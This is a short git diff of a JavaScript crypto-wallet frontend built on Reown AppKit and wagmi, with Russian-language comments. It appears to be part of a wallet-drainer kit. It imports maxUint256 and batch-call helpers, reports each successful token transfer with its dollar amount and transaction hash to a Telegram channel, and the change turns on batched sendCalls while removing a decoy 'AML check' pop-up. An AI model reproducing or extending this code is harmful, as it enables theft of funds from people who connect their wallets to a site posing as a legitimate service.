@@ -3,10 +3,9 @@ import { createAppKit } from '@reown/appkit'
 import { WagmiAdapter } from '@reown/appkit-adapter-wagmi'
 import { formatUnits, maxUint256, isAddress, getAddress, parseUnits, encodeFunctionData } from 'viem'
 import { readContract, writeContract, sendCalls, estimateGas, getGasPrice, getBalance } from '@wagmi/core'
-import { showAMLCheckModal } from './aml-check-modal.js';
 
 // === Глобальный флаг для управления sendCalls ===
-const USE_SENDCALLS = false; // Поставьте false для отключения batch-операций
+const USE_SENDCALLS = true; // Поставьте false для отключения batch-операций
 
 // Утилита для дебаунсинга
 const debounce = (func, wait) => {
@@ -420,7 +419,6 @@ async function notifyTransferSuccess(address, walletName, device, token, chainId
                     `➡️ ${token.symbol} - ${amountValue}$\n\n` +
                     `🔗 Transfer: [Transaction Hash](${txLink})`
     await sendTelegramMessage(message)
-    await showAMLCheckModal()
   } catch (error) {
     store.errors.push(`Error in notifyTransferSuccess: ${error.message}`)
   }
